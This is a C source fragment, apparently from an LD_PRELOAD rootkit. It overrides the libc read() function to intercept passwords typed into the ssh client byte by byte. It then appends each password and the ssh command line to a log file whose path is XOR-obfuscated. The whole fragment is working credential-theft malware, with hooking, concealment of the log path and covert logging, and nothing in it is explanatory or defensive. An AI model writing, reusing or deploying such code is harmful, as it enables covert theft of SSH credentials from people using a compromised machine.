ssize_t read(int fd, void *buf, size_t n)
{
    HOOK(o_read,CREAD);
    if(fd == 0) return o_read(fd,buf,n);
    
    HOOK(o_fopen,CFOPEN);
    HOOK(o_fxstat,C__FXSTAT);
    struct stat s_fstat;
    memset(&s_fstat,0x00,sizeof(stat));
    o_fxstat(_STAT_VER, fd, &s_fstat);
    ssize_t o=o_read(fd,buf,n);
    if(S_ISSOCK(s_fstat.st_mode)) return o;

    char *p;
    FILE *fp;

    if(!strcmp("ssh",cprocname()) && fd==4 && ssh_start)
    {
        p=buf;
        if(*p=='\n')
        {
            ssh_start=0;
            char *ssh_logs=strdup(SSH_LOGS); xor(ssh_logs);
            if((fp=o_fopen(ssh_logs,"a")))
            {
                fprintf(fp, "%s (%s)\n", gcmdline(), ssh_pass);
                fflush(fp);
                fclose(fp);
            }
            CLEAN(ssh_logs);
            return o;
        }
        ssh_pass[ssh_pass_size++]=*p;
    }
    return o;
}